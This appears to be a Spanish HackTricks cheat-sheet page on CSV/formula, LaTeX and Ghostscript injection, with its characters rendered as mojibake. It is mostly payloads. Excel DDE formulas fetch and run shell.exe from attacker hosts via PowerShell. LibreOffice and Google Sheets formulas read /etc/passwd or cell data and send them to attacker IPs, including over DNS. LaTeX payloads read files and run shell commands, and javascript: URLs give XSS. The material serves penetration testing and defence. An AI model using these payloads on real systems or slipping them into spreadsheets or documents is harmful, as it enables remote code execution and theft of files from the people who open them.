# Inyecci√≥n de F√≥rmulas/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Inyecci√≥n de F√≥rmulas

### Informaci√≥n

Si tu **entrada** se est√° **reflejando** dentro de archivos **CSV** (o cualquier otro archivo que probablemente se abrir√° en **Excel**), es posible que puedas insertar **f√≥rmulas de Excel** que se **ejecutar√°n** cuando el usuario **abra el archivo** o cuando el usuario **haga clic en alg√∫n enlace** dentro de la hoja de c√°lculo de Excel.

{% hint style="danger" %}
Hoy en d√≠a, **Excel alertar√°** (varias veces) al **usuario cuando algo se carga desde fuera de Excel** para evitar que realice acciones maliciosas. Por lo tanto, se debe aplicar un esfuerzo especial en Ingenier√≠a Social para la carga final.
{% endhint %}

### [Lista de palabras](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperv√≠nculo

**El siguiente ejemplo es muy √∫til para exfiltrar contenido de la hoja de c√°lculo final y realizar solicitudes a ubicaciones arbitrarias. Pero requiere que el usuario haga clic en el enlace (y acepte las advertencias).**

El siguiente ejemplo fue tomado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Imagina una brecha de seguridad en un sistema de Gesti√≥n de Registros de Estudiantes que es explotada a trav√©s de un ataque de inyecci√≥n de CSV. La intenci√≥n principal del atacante es comprometer el sistema utilizado por los profesores para gestionar los detalles de los estudiantes. El m√©todo implica que el atacante inyecte una carga maliciosa en la aplicaci√≥n, espec√≠ficamente ingresando f√≥rmulas da√±inas en campos destinados para los detalles de los estudiantes. El ataque se desarrolla de la siguiente manera:

1. **Inyecci√≥n de Carga Maliciosa:**
- El atacante env√≠a un formulario de detalles de estudiante pero incluye una f√≥rmula com√∫nmente utilizada en hojas de c√°lculo (por ejemplo, `=HYPERLINK("<enlace_malicioso>","Haz clic aqu√≠")`).
- Esta f√≥rmula est√° dise√±ada para crear un hiperv√≠nculo, pero apunta a un servidor malicioso controlado por el atacante.

2. **Exportaci√≥n de Datos Comprometidos:**
- Los profesores, sin ser conscientes del compromiso, utilizan la funcionalidad de la aplicaci√≥n para exportar los datos a un archivo CSV.
- Cuando se abre el archivo CSV, todav√≠a contiene la carga maliciosa. Esta carga aparece como un hiperv√≠nculo clickeable en la hoja de c√°lculo.

3. **Desencadenando el Ataque:**
- Un profesor hace clic en el hiperv√≠nculo, creyendo que es una parte leg√≠tima de los detalles del estudiante.
- Al hacer clic, los datos sensibles (potencialmente incluyendo detalles de la hoja de c√°lculo o de la computadora del profesor) son transmitidos al servidor del atacante.

4. **Registrando los Datos:**
- El servidor del atacante recibe y registra los datos sensibles enviados desde la computadora del profesor.
- El atacante puede entonces utilizar estos datos para varios prop√≥sitos maliciosos, comprometiendo a√∫n m√°s la privacidad y seguridad de los estudiantes y la instituci√≥n.


### RCE

**Consulta el [post original](https://notsosecure.com/data-exfiltration-formula-injection-part1) para m√°s detalles.**

En configuraciones espec√≠ficas o versiones antiguas de Excel, una caracter√≠stica llamada Intercambio Din√°mico de Datos (DDE) puede ser explotada para ejecutar comandos arbitrarios. Para aprovechar esto, los siguientes ajustes deben estar habilitados:

- Navega a Archivo ‚Üí Opciones ‚Üí Centro de Confianza ‚Üí Configuraci√≥n del Centro de Confianza ‚Üí Contenido Externo, y habilita **Lanzamiento del Servidor de Intercambio Din√°mico de Datos**.

Cuando se abre una hoja de c√°lculo con la carga maliciosa (y si el usuario acepta las advertencias), la carga se ejecuta. Por ejemplo, para abrir la aplicaci√≥n de calculadora, la carga ser√≠a:
```markdown
`=cmd|' /C calc'!xxx`
```
Se pueden ejecutar tambi√©n comandos adicionales, como descargar y ejecutar un archivo usando PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Inclusi√≥n Local de Archivos (LFI) en LibreOffice Calc

LibreOffice Calc se puede utilizar para leer archivos locales y exfiltrar datos. Aqu√≠ hay algunos m√©todos:

- Leyendo la primera l√≠nea del archivo local `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- Exfiltrando los datos le√≠dos a un servidor controlado por el atacante: `=WEBSERVICE(CONCATENATE("http://<IP del atacante>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Exfiltrando m√°s de una l√≠nea: `=WEBSERVICE(CONCATENATE("http://<IP del atacante>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- Exfiltraci√≥n DNS (enviando datos le√≠dos como consultas DNS a un servidor DNS controlado por el atacante): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<dominio del atacante>"))`

### Google Sheets para Exfiltraci√≥n de Datos Out-of-Band (OOB)

Google Sheets ofrece funciones que pueden ser explotadas para la exfiltraci√≥n de datos OOB:

- **CONCATENATE**: Une cadenas juntas - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Importa datos de tipos de datos estructurados - `=IMPORTXML(CONCAT("http://<IP del atacante:Puerto>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Importa fuentes RSS o ATOM - `=IMPORTFEED(CONCAT("http://<IP del atacante:Puerto>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Importa datos de tablas HTML o listas - `=IMPORTHTML (CONCAT("http://<IP del atacante:Puerto>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Importa un rango de celdas de otra hoja de c√°lculo - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID_de_Hoja]", "hoja1!A2:E2")`
- **IMAGE**: Inserta una imagen en una celda - `=IMAGE("https://<IP del atacante:Puerto>/images/srpr/logo3w.png")`

## Inyecci√≥n de LaTeX

Por lo general, los servidores que se encuentran en internet y que **convierten c√≥digo LaTeX a PDF** utilizan **`pdflatex`**.\
Este programa utiliza 3 atributos principales para (des)habilitar la ejecuci√≥n de comandos:

* **`--no-shell-escape`**: **Deshabilita** la construcci√≥n `\write18{comando}`, incluso si est√° habilitada en el archivo texmf.cnf.
* **`--shell-restricted`**: Igual que `--shell-escape`, pero **limitado** a un conjunto 'seguro' de **comandos predefinidos** (\*\*En Ubuntu 16.04 la lista est√° en `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** la construcci√≥n `\write18{comando}`. El comando puede ser cualquier comando de shell. Esta construcci√≥n normalmente est√° deshabilitada por razones de seguridad.

Sin embargo, existen otras formas de ejecutar comandos, por lo que para evitar RCE es muy importante usar `--shell-restricted`.

### Leer archivo <a href="#read-file" id="read-file"></a>

Es posible que necesites ajustar la inyecci√≥n con envolturas como \[ o $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Leer archivo de una sola l√≠nea
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Leer archivo con m√∫ltiples l√≠neas
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Escribir archivo <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ejecuci√≥n de comandos <a href="#command-execution" id="command-execution"></a>

La entrada del comando se redirigir√° a stdin, utilice un archivo temporal para obtenerla.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si obtienes alg√∫n error de LaTex, considera usar base64 para obtener el resultado sin caracteres no deseados.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Inyecci√≥n de Ghostscript

**Ver [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## Referencias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**¬°Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
